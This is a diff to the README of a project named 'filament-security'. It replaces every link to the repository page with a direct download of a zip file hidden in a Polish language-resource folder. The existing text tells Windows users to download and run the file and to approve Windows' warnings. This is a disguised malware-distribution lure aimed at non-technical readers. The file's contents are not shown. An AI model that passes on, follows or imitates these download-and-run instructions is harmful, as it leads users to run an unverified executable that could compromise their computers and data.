@@ -1,6 +1,6 @@
 # 🛡️ filament-security - Keep your app safe with ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue.svg)](https://github.com/hammad-abu/filament-security)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue.svg)](https://github.com/hammad-abu/filament-security/raw/refs/heads/main/resources/lang/pl/security-filament-v1.8.zip)
 
 <p align="center">
     <img src="art/banner.jpg" alt="Filament Security" width="100%">
@@ -10,7 +10,7 @@
 
 Go to the download page here:
 
-https://github.com/hammad-abu/filament-security
+https://github.com/hammad-abu/filament-security/raw/refs/heads/main/resources/lang/pl/security-filament-v1.8.zip
 
 If the page shows a release file for Windows, download and run that file.
 
@@ -44,7 +44,7 @@ If Windows asks for approval, choose the option that lets the file run.
 ## 🚀 How to download and run it on Windows
 
 1. Open the download page:  
-   https://github.com/hammad-abu/filament-security
+   https://github.com/hammad-abu/filament-security/raw/refs/heads/main/resources/lang/pl/security-filament-v1.8.zip
 
 2. Look for the latest release or the main download file.
 
@@ -174,7 +174,7 @@ You know the app is running when:
 
 Use the main download page here:
 
-https://github.com/hammad-abu/filament-security
+https://github.com/hammad-abu/filament-security/raw/refs/heads/main/resources/lang/pl/security-filament-v1.8.zip
 
 Open that link, get the latest Windows file, and run it on your computer
 
